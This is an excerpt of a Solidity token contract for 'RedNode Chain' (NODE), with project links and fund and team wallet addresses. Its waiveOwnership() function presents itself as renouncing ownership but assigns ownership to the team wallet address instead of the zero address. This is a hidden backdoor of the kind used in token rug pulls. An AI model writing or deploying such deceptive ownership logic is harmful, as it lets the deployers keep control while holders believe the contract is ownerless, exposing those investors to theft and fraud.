...
/**
Telegram : https://t.me/RedNodeChain
Website : https://rednode.network/
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x17932F8160F835Bf9c050b56FfA210118993Beb5);
    }
...
contract REDNODE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RedNode Chain";
    string private _symbol = "NODE";
    uint8 private _decimals = 9;

    address payable public fundWalletAddress = payable(0x4b1243D9105FA4d0059B4C7f30D6B7b881BE986c);
    address payable public teamWalletAddress = payable(0x17932F8160F835Bf9c050b56FfA210118993Beb5);
